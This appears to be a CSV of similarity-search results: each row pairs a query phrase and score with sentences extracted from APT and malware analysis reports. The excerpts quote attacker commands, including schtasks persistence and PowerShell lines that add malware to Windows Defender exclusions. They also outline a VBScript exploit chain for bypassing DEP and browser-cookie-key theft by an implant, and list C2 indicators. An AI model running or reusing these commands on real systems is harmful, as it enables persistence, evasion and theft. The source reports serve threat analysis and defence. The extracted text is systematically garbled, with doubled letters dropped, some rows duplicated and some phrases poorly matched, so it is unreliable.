hash,phrase,similarity,adjacent_sentences
5300cfd53bf031f9c4870551702274ee,Windows Management Instrumentation (WMI).,0.8009961518182371,"['Its mainly used by red teams in IT security but also misused acros the spectrum of APT actors, e.g.', 'Lazarus Group, Telebots, Okrum etc.', 'After runing it in a test virtual environment, its output is (the incorect spaces before the comas are in the original): 1 #1 domain = MSEDGEWIN10, user = Administrator , nthash=FC525C9683E8FE067095BA2DC97189.', '2 #2 domain = MSEDGEWIN10, user = IEUser , nthash=FC525C9683E8FE067095BA2DC97189.', 'Lateral movement via WMI The atackers use an aditional tol to spread in the hosting network.', 'This time they leverage Windows Management Instrumentation (WMI).', 'Al relevant data is neded as the files name, as during the execution it expects @<ComputerName>,<UserName>,<Pasword>,.exe.', 'In the first step, a console to a remote computer is established, where the conection is identified by <ComputerName> and authenticated with (<UserName>, <Pasword>).', 'Afterwards, proxy htps:/w.welivesecurity.com/2020/05/14/mikrocen-spying-backdor-high-profile-networks-central-asia/ 3/7 5/15/2020 Mikrocen: Spying backdor leveraged in high-profile networks in Central Asia | WeLiveSecurity security is set to the strict level, which means arguments of each remote procedure cal are encrypted and the servers aces to local resources is alowed.', 'Then WMI is used again to retrieve the Win32_Proces clas, which in turn is used to create a proces with given parameters.', 'When al the work is done, the tol terminates itself.']"
9dfd4e4ee0b137307871d958fcbbc521,Windows Management Instrumentation (WMI).,0.8539446285641696,"['1 Technical Details .', '4 Background .', '4 Artifacts .', '4 Network artifacts .', '4 Host artifacts .', '5 Windows management instrumentation (WMI/WMIC) .', '5 Ntds.dit Active Directory database .', '5 PortProxy .', '8 PowerShel .', '10 Impacket .', '10 Enumeration of the environment .']"
c535fe3c1b9e7485ff2a5fa8766d741b,The decryption algorithm,0.7791055362100768,"['If the input argument is adr(0x1234), first ad 4 to the value to get 0x12348, and then set the variant type to 8 (string type).', 'Next, cal len function: if found to be BSTR type, vbscript wil asume that the forward 4 bytes (0x1234) is the adres memory to store the length.', 'So the len function wil be executed and the value of the specified memory adres wil be returned.', 'Obtain Key DL Base Adres 1.', 'The atacker leaks the virtual function table adres of the CScriptEntryPoint object in the folowing way, which belongs to Vbscript.dl.', '1.', 'Obtain the vbscript.dl base adres in the folowing way.', '1.', 'Because vbscript.dl imported msvcrt.dl, the msvcrt.dl base adres was obtained by traversing the vbscript.dl import table, msvcrt.dl introduces kernelbase.dl, ntdl.dl, and finaly the NtContinue, VirtualProtect function adres was obtained.', 'Save web pages as PDF with PDFmyURL Bypas DEP to execute shelcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then asign it with a value of 0 to make the virtual machine perform VAR: Clear function.']"
c535fe3c1b9e7485ff2a5fa8766d741b,The decryption algorithm,0.7791055362100768,"['If the input argument is adr(0x1234), first ad 4 to the value to get 0x12348, and then set the variant type to 8 (string type).', 'Next, cal len function: if found to be BSTR type, vbscript wil asume that the forward 4 bytes (0x1234) is the adres memory to store the length.', 'So the len function wil be executed and the value of the specified memory adres wil be returned.', 'Obtain Key DL Base Adres 1.', 'The atacker leaks the virtual function table adres of the CScriptEntryPoint object in the folowing way, which belongs to Vbscript.dl.', '1.', 'Obtain the vbscript.dl base adres in the folowing way.', '1.', 'Because vbscript.dl imported msvcrt.dl, the msvcrt.dl base adres was obtained by traversing the vbscript.dl import table, msvcrt.dl introduces kernelbase.dl, ntdl.dl, and finaly the NtContinue, VirtualProtect function adres was obtained.', 'Save web pages as PDF with PDFmyURL Bypas DEP to execute shelcode 1.', 'Use arbitrary reading and writing technique to modify the VAR type type to 0x4d, and then asign it with a value of 0 to make the virtual machine perform VAR: Clear function.']"
fcef139433bae54ea996aa09f7e1fcf4,decryption function.,0.8506039784321054,"['The executables were sen with the filenames ""Update.exe"", ""ntfsc.exe"" or ""nx"" in this campaign.', 'They are either downloaded or droped into the victim\'s ""local aplication data"" folder and run as a Windows Security update with medium integrity to elevate the privileges of a standard user.', 'The actor uses comon encoding techniques to obfuscate strings in the WinMain function to hide its behavior from static analysis tols.', 'WinMain function snipet.', 'The decryption function receives the encrypted strings and decrypts each character with the XOR operation and stores the result in an aray that wil be returned to the caler function.', '1/19 Decryption function.', ""The malware searches for the Windows Defender and Kaspersky antivirus proceses in the victim's machine by creating the snapshot of runing proceses using CreateTolhelp32Snapshot and iterates through each proces using API Proces32First and Proces32Next."", 'WinMain() snipet showing antivirus proces detection.', ""12/19 The information-gathering function gathers the victim's hostname, operating system product name, and the victim's username and writes them into a memory bufer."", 'Information-gathering function.', 'The C2 comunicating function at ofset 401C50 is caled from the two other requests making functions to send the victim\'s information with the decrypted strings ""xnb/dxagt5avb2.php?txt="" and ""data1.php?']"
7856ebf4259ae125d28e1268047ceb06,the encrypted data,0.8529851505836112,"['In modern cybersecurity aproaches, authorization could also incorporate other risk factors such as behavioral analytics and evaluation of threat inteligence.', 'Microsoft Digital Defense Report | September 2020 83 TABLE OF CONTENTS INTRODUCTION THE STATE OF CYBERCRIME NATION STATE THREATS SECURITY AND THE REMOTE WORKFORCE ACTIONABLE LEARNINGS GLOSARY breach ciphertext data estate encryption Any incident that results in unauthorized aces of Data or information in its encrypted form used The procedures, services, and infrastructure used to The proces of transforming plaintext into data, aplications, services, networks, and/or devices primarily by cryptology experts.', 'Sometimes refered manage corporate data in the digital estate.', 'ciphertext.', 'by bypasing their underlying security mechanisms.', 'to as encrypted data.', 'A security breach ocurs when an individual or data los prevention (DLP) event an aplication ilegitimately enters a private, cloud aces security broker (CASB) A set of procedures and mechanisms to stop An observable ocurence in an information system confidential, or unauthorized logical IT perimeter.', 'A CASB is a software tol or service that sensitive data from leaving a security boundary.', 'or network.', 'sits betwen an organizations on-premises brownfield infrastructure and a cloud providers infrastructure.', 'denial of service exfiltration Existing deployed IoT/IoT devices that might not They might also provide other services such as An atack that prevents or impairs the authorized The unauthorized transfer of information from an have modern hardware or functionality.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption.,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
ac0df47c7a7c71929ea786a25a27fdd7,decryption.,0.8539491256374303,"['This indicates that the Mafalda implant is a maintained, ongoing project.', 'The figures below depict the functions in the older and the newer Mafalda variant that handle the procesing of the diferent backdor comands based on the comand number.', 'Fig 8: Older Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 13 Fig 9: Newer Mafalda variant: Procesing of backdor comands THE MYSTERY OF METADOR | AN UNATRIBUTED THREAT HIDING IN TELCOS, ISPS, AND UNIVERSITIES 14 1 htps:/atack.mitre.org/software/S073/ The ful unobfuscated list of comands, along with the developers descriptions, are available in the Mafalda section of the Technical Apendix.', 'The folowing functionality is only available in the newer Mafalda variant: Network and system configuration reconaisance.', 'Information theft and implant orchestration.', 'Data decryption.', 'Filesystem operations.', 'The folowing is a sumary of some of the newer Mafalda comands: Comand 60 Reads the content of the file %USERPROFILE%\\ApData\\Local\\Gogle\\Chrome\\User Data\\Local State and sends the file content to the C2 server as part of a packet with a name prefixed with lot\\.', 'The Local State file stores security-relevant data, such as an encryption key that Chrome uses to protect cokies.', 'The environment variable %USERPROFILE% expands to the path to the profile folder of the user in whose context Mafalda runs, such as C:\\Users\\test for the user test.', 'Comand 61 Decrypts atacker-provided data using the DPAPI (Data Protection Aplication Programing Interface) key of the platform where Mafalda runs.']"
41d6e1e379006c93e59f114b3161977e,decryption.,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
41d6e1e379006c93e59f114b3161977e,decryption.,0.8016585728073772,"['Payload .VBS file Analysis The folowing screnshot shows a part of the .VBS payload file droped by .RTF file.', 'First line is the encrypted .dl 4th line contains Key to decrypt the .dl.', 'Remaining part is self-explanatory.', 'The instruction c = Crypt(c,k) function decrypts the encrypted dl and returns the decrypted dl.', '(Se the screnshot above) c= encrypted dl.', 'k = decryption key.', 'Folowing function writes byte by byte to the droped.dl file.', 'Finaly, the folowing code executes the regsvr32 comand to run the wmiprvse.dl in silent mode and sets the run key in registry.', 'Payload wmiprvse.dl file Analysis This first level of deobfuscation in wmiprvse.dl takes around 3-4 minutes to finish.', 'Then it alocates memory using VirtualAloc and writes the unpacked code to newly alocated memory before it jumps to the unpacked code as shown in folowing scren shot.', 'This dl has 3 layers of unpacking.']"
c53da9ec05d78bde1eab4d813ea4924f,decryption.,0.780670919688295,"['{ 3. meta: 4.', '5. description = ""Detects obfuscation paterns used in HALFRIG.', 'This rule wasn\'t tested against large dataset, it should be used for threat hunting and not on services like VTI.""', '6.', '7. strings: 8.', '/ Decryption constants and decryption operation 9.', '$ = {48 B 0B 91 09 19 4D FD 9B F3 } 10.', '1.', '$ = {4D 8D 40 01 48 8B CA 48 8B C2 48 C1 E9 38 48 83 C9 01 48 C1 E0 08 48 8B D1 48 3 D0} 12.', '13.', '$ = {C7 05 [3] 0 F7 91 4D 01 } 14.']"
9f37e71695d9bbc0a254d54d1edbdb58,decryption.,0.7633052540464057,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
9f37e71695d9bbc0a254d54d1edbdb58,decryption.,0.7633052540464057,"['Hashes of the analyzed samples .', '6 2.', 'Similarities and diferences .', '7 2.1.', 'General details .', '7 2.2.', 'String decryption .', '9 2.3. AES encryption of the configuration file .', '14 2.4.', 'Format of the (encrypted) configuration file .', '24 2.5.']"
3e9312913ace03550c810e6b92ab1d61,whoami.exe,0.8897874484664595,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
3e9312913ace03550c810e6b92ab1d61,whoami.exe,0.8897874484664595,"['Nomadic Octopus Paperbug Campaign TLP:CLEAR NomadicOctopusTajikistanCampaign: Paperbug Contents References 2 1 Glosary 3 2 Introduction 3 3 ExecutiveSumary 4 3.1 Overview .', '.', '.', '.', '.', '.', '.']"
5ec66f544ee1add632266a0f85caefec,activity from Tor,0.794063206823338,"['Wecombinethesetwometricstoformanoveralthreat 1 Introduction ranking that we cal the Targeted Threat Index (TI).', 'Whileotherscoringsystemsexistforcharacterizingthe Civil society organizations (CSOs), working on hu- level of severity and danger of a technical vulnerabil- man rights isues around the globe, face a spectrum ity[7,17,41,50], nocomonsystemexistsforanking ofpoliticaly-motivatedinformationsecuritythreatsthat thesophisticationoftargetede-mailatacks.', 'TIalows sektodeny(e.g.', 'Internetfiltering,denial-of-serviceat- us to gain insights into the relative sophistication of so- tacks), manipulate (e.g.', 'website defacements) or moni- cialengineringandmalwareleveragedagainstCSOs.', 'tor (e.g.', 'targeted malware) information related to their Akeytothesucesofourstudyisauniquemethod- work.', 'Targeted malware atacks in particular are an in- ology, combining qualitative and technical analysis of USENIX Asociation 23rd USENIX Security Symposium 527 e-mails and their atachments with fieldwork (e.g.', 'site in Section 4.', 'Training and outreach implications of our visits)andinterviewswithafectedCSOs.', 'Thismethod- workarediscusedinSection5.Wepresentrelatedwork ology,whichwedescribeinmoredetailinSection3,al- inSection6andconcludeinSection7.']"
0e9ec9637a8bfba9a7ffdcaae688abe5,activity from Tor,0.794063206823338,"['Scotsboro City Board of The Payrol Department of the Acount Hijacking P Education Cyber US Link Education Scotsboro City Board of Crime Education fals victim of a phishing scam.', 'The atackers requested W-2 information from al employes.', '01/03/2018 ?', ""Rockdale Independent Schol An email phishing scheme causes Acount Hijacking P Education Cyber US Link District several Rockdale ISD employes' Crime taxes to be falsely filed and compromises confidential tax information for al employes."", '01/03/2018 ?', 'b-tor[.', ']ru Users Researchers from Palo Alto Malware/PoS Malware X Individual Cyber RU Link Networks discover a Rusian Crime BitTorent Site distributing a Monero Miner.', '01/03/2018 ?', 'Colorado Department of For the second time in two weks, Malware/PoS Malware O Public Cyber US Link Transportation (CDOT) the computers at the Colorado administration, Crime Department of Transportation defence, Agency shut down 2,0 compulsory computers after a ransomware social security infection.', '01/03/2018 ?', 'Primary Health Care Primary Health Care notifies Acount Hijacking Q Human health Cyber US Link patients after discovering hack of and social work Crime employe email acounts.']"
08a0ccc49008dbbf532b22d39ac2b886,or delete files,0.9100446427209737,"['Upon execution, MagicRAT achieves persistence for itself by executing a hardcoded comand that creates scheduled tasks on the victim machine.', 'Comand Intent schtasks /create /tn ""OneDrive AutoRemove"" /tr Scheduled task starting at ""C:\\Windows\\System32\\cmd.exe /c del /f /q a specific time C:/TEMP/[MagicRAT_file_name].exe"" /sc daily /st 10:30:30 /ru [T1053/05] SYSTEM Scheduled task starting at schtasks /create /tn ""Microsoft\\Windows\\light Service Manager"" /tr a diferent time an path C:/TEMP/[MagicRAT_file_name].exe /sc onstart /ru SYSTEM [T1053/05] %HOME%/ApData/Roaming/Microsoft/Windows/Start Link created on startup Menu/Programs/Startup/OneNote.lnk folder [T1547/01] Upon achieving persistence, the RAT contacts the C2.', '4/12 During the initial stages of execution, MagicRAT wil perform just enough system reconaisance to identify the system and environment in which the atackers are operating.', 'This is done by executing the comands whoami, systeminfo and ipconfig /al.', 'The last comand has its results returned via the upload of the file zero_dump.mix to the C2.', ""MagicRAT is rather simple it provides the operator with a remote shel on the victim's system for arbitrary comand execution, along with the ability to rename, move and delete files on the endpoint."", 'The operator can determine the timing for the implant to slep, change the C2 URLs and delete the implant from the infected system.', 'We also discovered a new variant of MagicRAT in the wild generated in April 202.', 'This sample now consisted of the ability to delete itself from the infected endpoint using a BAT file.', 'Aditional malware One of the C2 servers used by the new MagicRAT sample, 64[.]18[.]27[.', ']73, hosted two more distinct implants masquerading as GIF URLs.']"
b5d067b705e3d7716dc5cd360e61cc7d,Scheduled task,0.7802401837560938,"['The namespaces and clases from the deobfuscated samples 1 | Earth Baku: An APT Group Targeting Indo-Pacific Countries With New Stealth Loaders and Backdor Al the strings in StealthMutant are encrypted with the encryption algorithm AES-256-ECB and are decrypted on the spot, as shown in Figure 13.', 'The decrypted strings are as folows: 1.', 'The MagicString clas provides a geter property, which decrypts strings on aces.', '2.', 'The MagicString clas has an encrypted string field.', '3.', 'The MagicString clas provides _Decrypt, a wraper method for decryption.', '4.', 'If it is StealthMutants first time to use the _Decrypt method, the AES (Advanced Encryption Standard) key and initialization vector (IV) wil be initialized based on the hard-coded _factory value, although this IV is meaningles in Electronic Code Block (ECB) mode.', 'The key is the SHA-256 hash, while the IV is the MD5 hash.', 'The values of the SHA-256 and MD5 hashes vary with each StealthMutant sample.']"
751a00c60e4d6cfbca29fd60f12530fc,Scheduled task,0.7899713560434016,"['Tactic ID Name Description Initial ScarCruft uses watering-hole atacks to T189 Drive-by Compromise Aces compromise victims.', 'Execution Comand and Scripting Interpreter: T1059.06 The Dolphin loader a uses Python script.', 'Python 7/8 Tactic ID Name Description Comand and Scripting Interpreter: ScarCruft used malicious JavaScript for a T1059.07 JavaScript watering-hole atack.', 'ScarCruft exploits CVE-2020-1380 to T1203 Exploitation for Client Execution compromise victims.', 'Dolphin uses Windows API functions to execute T106 Native API files and inject proceses.', 'Scheduled Task/Job: Scheduled Dolphin uses a temporary scheduled task to T1053.05 Task start after instalation.', 'Persistence Bot or Logon Autostart Execution: Dolphin uses Run keys for persistence of its T1547.01 Registry Run Keys / Startup Folder loader.', 'Proces Injection: Portable Defense T105.02 Dolphin can inject into other proceses.', 'Executable Injection Evasion T1027 Obfuscated Files or Information Dolphin has encrypted components.', 'Credentials from Pasword Stores: Dolphin can obtain saved paswords from Credential T15.03 Credentials from Web Browsers browsers.', 'Aces T1539 Steal Web Sesion Cokie Dolphin can obtain cokies from browsers.']"
decab25100660c0deaa8f97d0f3bf308,Scheduled task,0.7601237586297603,"['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the folowing: 1.', 'On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is instaled on the victims machine.']"
decab25100660c0deaa8f97d0f3bf308,Scheduled task,0.76857650111508,"['Figure 7.', 'Intrusion flow sequence diagram An overview of whats shown in the sequence diagram above is the folowing: 1.', 'On launch, the primary NoxPlayer executable Nox.exe wil send a request via the API to query update information.', '2.', 'The BigNox API server responds to the client request with specific update information, including the URL to download the update from BigNox legitimate infrastructure.', '3.', 'Nox.exe provides the apropriate parameters to NoxPlayer.exe to download the update.', '4.', 'The legitimate update stored in BigNox infrastructure could have ben replaced with malware, or it may be a new filename/URL not used by legitimate updates.', '5.', 'Malware is instaled on the victims machine.']"
399c17d5f44d8b855c9751aae73f3c11,Scheduled task,0.7518470907202128,"['The atackers sent their victims archives containing malicious executable files whose names ended with PDF so that the victim would think it was a real document and open the file.', ""Figure 34 Phishing email Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 81 After the malicious file named paymentSlip.pdf.exe was run on the victim's computer, several files were saved to shared directories."", 'Then the atackers ran PowerShel and aded these files to the MS Windows Defender exclusions list.', '""$windir\\$system32\\WindowsPowerShel\\v1.0\\PowerShel.exe"" Ad-MpPreference -ExclusionPath ""$user\\$apdata\\aPCyDwLsApDgb.exe"" (MITRE: T1562.01 Impair Defenses: Disable or Modify Tols).', 'After that, they used the standard tol named schtasks.exe to create scheduled tasks, and one of the files previously droped onto the computer served as the configuration file for these tasks.', '""$windir\\$system32\\schtasks.exe"" /Create /TN ""Updates\\aPCyDwLsApDgb"" /XML ""$user\\$temp\\tmp8ACB.tmp"" (MITRE: T1053.05 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 82 Example launch of malware in Kaspersky Sandbox: Figure 35 Ilustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 83 Example 3 Another similar example of a phishing email.', 'The email contains two atached archives: Figure 36 Phishing email When 25th April_PDF.exe is run, it uses PowerShel to change the configuration of Windows Defender: ""$windir\\$system32\\WindowsPowerShel\\v1.0\\PowerShel.exe"" Ad-MpPreference -ExclusionPath ""$selfpath\\$selfname.exe"" (MITRE: T1562.01 Impair Defenses: Disable or Modify Tols).', 'Then it creates a task in the scheduler to achieve persistence: ""$windir\\$system32\\schtasks.exe"" /Create /TN ""Updates\\htOTEVF"" /XML ""$user\\$temp\\tmp56EA.', 'tmp"" (MITRE: T1053.05 Scheduled Task/Job: Scheduled Task).', 'Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 84 Figure 37 Ilustration of an Execution Graph in TIP The 24th April_PDF.exe sample also ads itself to Windows Defender exclusions, then gathers acount credentials from browsers: Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 85 Figure 38 Ilustration of an Execution Graph in TIP Modern Asian APT Groups: Tactics, Techniques and Procedures Technical details | Initial Aces TA01 | Phishing: Spearphishing Atachment T156.01 Contents 86 Figure 39 Atack scenario Droped EXE Start Exclude power malware shel Atachment Contains Masquerading extension PDF EXE Phishing RAR EXE email Droped TMP Importing task Create scheduled task Detection The folowing aproaches are used to detect phishing: Deployment of Secure Email Gateway solutions with dynamic technologies (sandbox) for scaning atachments in emails Analyzing web trafic and identifying suspicious websites that may be linked to phishing atacks by means of malware detection and monitoring systems Giving users the capability to report suspicious emails or websites that they believe are phishing.']"
cae33c8970a53857dff6608fe8894b8a,Scheduled task,1.0,"['Copyright Leonardo S.p.a. Al rights reserved 2 Company General Use MALWARE TECHNICAL INSIGHT: TURLA Penquin_x64 6.', 'MITRE AT&CK TPs T1059 Comand-Line Comand-line interfaces provide a way of interacting with computer Interface systems and is a comon feature acros many types of operating system platforms.', 'One example comand-line interface on Windows systems is cmd, which can be used to perform a number of tasks including execution of other software.', 'Comand-line interfaces can be interacted with localy or remotely via a remote desktop aplication, reverse shel sesion, etc.', 'Comands that are executed run with the curent permision level of the comand-line interface proces unles the comand includes proces invocation that changes permisions context for that execution (e.g.', 'Scheduled Task).', 'T1205 Port Knocking Port Knocking is a wel-established method used by both defenders and adversaries to hide open ports from aces.', 'To enable a port, an adversary sends a series of packets with certain characteristics before the port wil be opened.', 'Usualy this series of packets consists of atempted conections to a predefined sequence of closed ports, but can involve unusual flags, specific strings or other unique characteristics.', 'After the sequence is completed, opening a port is often acomplished by the host based firewal, but could also be implemented by custom software.', 'T105 Remote File Files may be copied from one system to another to stage adversary Copy tols or other files over the course of an operation.']"
a9e5224d5686f541f8796eb25399c125,Scheduled task,0.7884814873277122,"['RESEARCH_ Docles Vietnam APT Inovacin y laboratorio April 2019 elevenpaths.com RESEARCH_ Docles Vietnam APT -A technique stil alive- Index What have we discovered?', '.', '3 Globaly Unique Identifier (GUID) .', '3 Docles DOC with thre stages .', '4 DOS OBFUSCATION .', '5 DISKLES POWERSHEL.', '6 The final stage, uninstaling yourself .']"
0797d04ce55799cf7c3246d39567ce99,Scheduled task,0.8551867234600203,"['Analyze The recipients of the document 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf 8.t are (at the end of the document): the deputy minister; - the units under the ministry; - police of provinces and cities directly under the central government; - Department of Inspection of Legal Documents of the Ministry of Justice; - Oficial Journal, Government Electronic Portal, Ministry of Public Security Portal; - Archive: VT, C06 (P1).', 'The document exploits Equation Editor starts aplication (CVE-2017182) to decode the 8.t in memory, after fork to instal two files: C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f and C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da The malware is a dl, it sems to be Gh0st RAT.', 'htps:/ap.any.run/tasks/5715cfe3-250-4808-ad0-1ea4c4fc7a8 An to start the malware, it uses a side loading technics with a scheduled Task.', 'The exe cal in the entry loads dynamicaly wsc.dl and cal the function _run@4 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 1/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Side Loading Scheduled Task The RAT tries to conect to nicetis54.lflink.com|185.216.35.1.', 'htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 2/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese Threat Inteligence Consideration We have the same Tps and victimology like Goblin Panda: Oficials Vietnameses Side Loading 8.t RTF kit exploit a dynamic dns name But the payload has changed and the launch of the backdor has changed.', 'Its used a scheduled task.', 'Usualy this group uses NewCoreRat.', 'IOCs Main object- 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha256 41f0757ca4367f2b0aece32520879135c96ebe1dcafcd752d3f3c8d4a5cf sha1 6e670a837970a1fb4161d7d5f720d318d7e4dbc md5 f3451418eb4689560cd6c0c654f26d9 Droped executable file sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc.dl 4e8f8a3c3be45e0a59a868f2b2ace51754fcdbfa9ab618e3d9d0e1783190f sha256 C:\\Users\\admin\\ApData\\Local\\Temp\\wsc_proxy.exe 1948b0df1f768d6d30ae7ecec50db7c817d09cb31b5e2ce9b86a4047da htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 3/4 5/14/2019 Chineses Actor APT target Ministry of Justice Vietnamese DNS requests domain nicetis54.lflink.com Conections ip 185.216.35.1 htps:/medium.com/chineses-actor-apt-target-ministry-of-justice-vietnamese-14f13c1c906 4/4']"
